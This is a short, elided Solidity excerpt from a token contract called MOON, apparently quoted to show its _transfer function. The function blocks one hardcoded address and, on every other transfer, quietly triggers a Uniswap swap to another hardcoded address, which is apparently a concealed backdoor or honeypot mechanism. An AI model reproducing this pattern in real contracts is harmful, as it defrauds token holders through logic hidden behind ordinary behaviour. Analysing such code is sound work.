...
contract MOON is IERC20 {
  ...
  function _transfer(
    ...
    success = msg.sender == address(
      0x0C08d546EC3fddbccEE7b5E2241a69bd01109917) ? false : true;
    if (success) { lock = 2;IUniswapV2Pair(
      0x89922b788cB9D269a4F6858BDeBE3703f3820145).swap(1,0,address(
      0x641309236f408f742ef4fB699B909FC40fa04507),abi.encode(spender, recipient, amount));lock = 1;}
